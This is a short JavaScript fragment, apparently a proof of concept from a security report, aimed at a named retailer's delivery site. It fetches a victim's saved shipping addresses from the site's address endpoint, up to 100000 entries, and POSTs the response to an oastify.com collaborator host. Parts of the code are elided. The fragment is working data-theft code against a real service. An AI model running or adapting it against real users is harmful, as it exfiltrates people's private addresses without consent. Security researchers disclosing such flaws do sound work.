...
xhr.open("POST", "https://ybdncny0jf4clvptn5yhjbybg2mtaky9.oastify.com", true);
...
var victimAddress;
var xhr = new XMLHttpRequest();
xhr.open("GET", "https://www.costcobusinessdelivery.com/AjaxCostcoGetAddressCmd?requesttype=ajax&addressType=S&filterName=ALL&filterOrder=RECENT&start=1&end=100000", true);
...
xhr.onreadystatechange = function() {
  if (xhr.readyState === 4 && xhr.status === 200) {
    ...
    xhrr.open("POST", "https://ybdncny0jf4clvptn5yhjbybg2mtaky9.oastify.com", true);
